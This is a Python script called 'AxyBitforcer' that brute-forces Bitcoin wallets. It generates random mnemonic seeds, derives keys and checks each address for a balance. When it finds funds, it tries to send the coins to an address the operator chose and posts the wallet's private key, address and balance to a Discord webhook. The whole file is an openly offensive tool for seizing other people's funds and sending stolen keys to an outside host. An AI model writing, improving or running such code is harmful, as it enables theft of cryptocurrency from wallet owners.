from bit import Key
import bip32utils
from mnemonic import Mnemonic
import requests
import sys
import os

DISCORD_WEBHOOK_URL = ""  
DEFAULT_ADDRESS = ""
COUNT = 0

def send_to_discord(payload):
    requests.post(
            DISCORD_WEBHOOK_URL,
            json={
                "username": "AxyBitforcer",
                "embeds": [
                    {
                        "title": "Found some delicious Bitcoins for you!",
                        "fields": [
                            {
                                "name": "Address",
                                "value": payload['address']
                            },
                            {
                                "name": "Private Key (WIF)",
                                "value": payload['wif']
                            },
                            {
                                "name": "Current Balance",
                                "value": payload['balance']
                            },
                            {
                                "name": "Withdrawal Status",
                                "value": payload['status']
                            }
                        ]
                    }
                ]
            },
            headers={
                "Content-Type": "application/json",
                "User-Agent": "AxyBitforcer"
            }
        )

def check_balance(private_key):
    global COUNT
    COUNT += 1
    if COUNT == 20:
        COUNT = 0
        os.system('cls' if os.name == "nt" else "clear")
    wallet = Key(private_key)
    balance = wallet.get_balance('usd')
    print(f"[!] > Checking {wallet.address}")
    if float(balance) > 0:
        os.system('cls' if os.name == "nt" else "clear")
        print('[!] > Found some Bitcoins!')
        try:
            wallet.send([(DEFAULT_ADDRESS, balance, 'usd')], leftover=DEFAULT_ADDRESS)
            send_to_discord(payload={
                "address": wallet.address,
                "wif": wallet.to_wif(),
                "balance": balance,
                "status": "Success"
            })
            return True
        except Exception as e:
            send_to_discord(payload={
                "address": wallet.address,
                "wif": wallet.to_wif(),
                "balance": balance,
                "status": f"Something went wrong while trying to send the remaining Bitcoins\n{str(e)}"
            })        
            return True
    else:
        return False
    
def main():
    os.system('cls' if os.name == "nt" else "clear")
    print("[!] > AxyBitforcer is running. Keep this window open.")
    print("[!] > Notifications will be sent to your Discord.")
    print("[!] > To avoid spamming your console, for every 20 lines created the screen will be cleared once.")
    try:
        while True:
            mnemon = Mnemonic("english")
            new_mnemonic = mnemon.to_seed(mnemon.generate()) #Add 256 to generate 256 bit Mnemonic
            root_key = bip32utils.BIP32Key.fromEntropy(new_mnemonic)
            child_key = root_key.ChildKey(0).ChildKey(0)
            #Check all keys
            check_balance(root_key.WalletImportFormat())
            check_balance(child_key.WalletImportFormat())
    except Exception as e:
        raise e
    except KeyboardInterrupt:
        sys.exit("Goodbye!")
    
if __name__ == "__main__":
    os.system('cls' if os.name == "nt" else "clear")
    print("""
█████╗ ██╗  ██╗██╗   ██╗██████╗ ██╗████████╗███████╗ ██████╗ ██████╗  ██████╗███████╗██████╗ 
██╔══██╗╚██╗██╔╝╚██╗ ██╔╝██╔══██╗██║╚══██╔══╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗
███████║ ╚███╔╝  ╚████╔╝ ██████╔╝██║   ██║   █████╗  ██║   ██║██████╔╝██║     █████╗  ██████╔╝
██╔══██║ ██╔██╗   ╚██╔╝  ██╔══██╗██║   ██║   ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  ██╔══██╗
██║  ██║██╔╝ ██╗   ██║   ██████╔╝██║   ██║   ██║     ╚██████╔╝██║  ██║╚██████╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝   ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝""")
    print("[!] > AxyBitforcer - Bitcoin address bruteforcer. (ver 2.0)")
    DEFAULT_ADDRESS = input("[?] > In case you found some Bitcoins, where would you like to send it to?\n->")
    DISCORD_WEBHOOK_URL = input("[?] > Discord Webhook URL\n->")
    main()